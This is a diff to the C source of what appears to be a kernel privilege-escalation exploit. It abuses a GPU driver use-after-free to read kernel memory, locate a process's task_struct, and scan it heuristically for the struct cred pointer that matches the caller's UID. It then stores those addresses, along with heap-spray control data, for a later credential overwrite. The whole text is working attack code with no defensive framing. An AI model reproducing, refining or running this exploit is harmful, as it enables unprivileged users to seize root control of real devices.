@@ -1839,40 +1839,62 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 fprintf(stderr, "\n[?] POTENTIAL TASK FOUND at VA 0x%lx, offset 0x%x, PID=%d\n", 
                         (unsigned long)current_va, off, found_pid);
                 
-                // Adjust offsets dynamically based on where the marker was found
-                // We assume OFFSET_COMM (0x818) is the standard, so we shift accordingly
                 uint64_t task_start_va = current_va + off - OFFSET_COMM;
-                uint64_t cred_ptr_va = task_start_va + OFFSET_CRED;
+                uid_t my_uid = getuid();
+                uint64_t found_cred_ptr = 0;
+                uint32_t found_cred_off = 0;
 
-                // Verify task_struct by reading cred
-                uint64_t cred_ptr = 0;
-                gpu_read_task_struct(fd, cred_ptr_va, (uint8_t *)&cred_ptr, 8);
+                fprintf(stderr, "    [*] Searching for UID %d in task_struct range...\n", my_uid);
                 
-                if ((cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                // Scan task_struct for pointers that look like CRED (pointing to our UID)
+                // We scan from task_start + 0x400 to task_start + 0x800
+                uint8_t task_body[0x400];
+                if (gpu_read_task_struct(fd, task_start_va + 0x400, task_body, 0x400) == 0) {
+                    for (int i = 0; i < 0x400 - 8; i += 8) {
+                        uint64_t ptr = *(uint64_t *)(task_body + i);
+                        if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                            uint32_t check_uids[4];
+                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check_uids, 16) == 0) {
+                                if (check_uids[1] == my_uid && check_uids[2] == my_uid) {
+                                    found_cred_ptr = ptr;
+                                    found_cred_off = 0x400 + i;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+
+                if (found_cred_ptr) {
+                    fprintf(stderr, "    [+] Found valid CRED pointer at offset 0x%x: 0x%lx\n", 
+                            found_cred_off, (unsigned long)found_cred_ptr);
+                } else {
+                    fprintf(stderr, "    [-] Could not find UID %d near marker. Showing standard OFFSET_CRED...\n", my_uid);
+                    gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8);
+                }
+
+                if ((found_cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                     uint32_t uids[8];
-                    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)uids, 32) == 0) {
-                        uid_t my_uid = getuid();
+                    if (gpu_read_task_struct(fd, found_cred_ptr, (uint8_t *)uids, 32) == 0) {
                         int match = 0;
                         for(int j=0; j<8; j++) if(uids[j] == my_uid) match++;
                         
-                        fprintf(stderr, "    [*] Verification: CRED=0x%lx, UIDs: %d %d %d %d (Matches: %d)\n", 
-                                (unsigned long)cred_ptr, uids[0], uids[1], uids[2], uids[3], match);
+                        fprintf(stderr, "    [*] Data at 0x%lx: %d %d %d %d %d %d %d %d\n", 
+                                (unsigned long)found_cred_ptr, 
+                                uids[0], uids[1], uids[2], uids[3], uids[4], uids[5], uids[6], uids[7]);
                         
                         fprintf(stderr, "    [>] Use this candidate? (y/n): ");
                         fflush(stderr);
                         
                         char c = 0;
-                        // Read from stdin. In Termux/Shell this will wait.
-                        // We use a simple read(0, ...) to avoid issues with buffered getchar
                         if (read(0, &c, 1) > 0) {
                             if (c == 'y' || c == 'Y') {
                                 marker_found = 1;
                                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
                                 *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
-                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = cred_ptr;
-                                *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off;
+                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
+                                *(uint32_t *)&gbuf[GBUF_COMM_OFF] = off; 
                                 
-                                // Protect target PID
                                 for (int si = 0; si < SPRAY_COUNT_MAX; si++) {
                                     if (spray_ctrl[si].pid == found_pid) {
                                         spray_ctrl[si].do_action = 1;
@@ -1881,15 +1903,14 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 }
                                 fprintf(stderr, "\n[!!!] PROCEEDING with Task at 0x%lx\n", (unsigned long)task_start_va);
                             } else {
-                                fprintf(stderr, "    [-] Skipping candidate...\n");
+                                fprintf(stderr, "    [-] Skipping...\n");
                             }
-                            // Clean up newline from buffer
                             char dummy;
                             while(read(0, &dummy, 1) > 0 && dummy != '\n');
                         }
                     }
                 } else {
-                    fprintf(stderr, "    [-] Invalid CRED pointer: 0x%lx\n", (unsigned long)cred_ptr);
+                    fprintf(stderr, "    [-] Invalid/Null CRED pointer.\n");
                 }
             }
         }
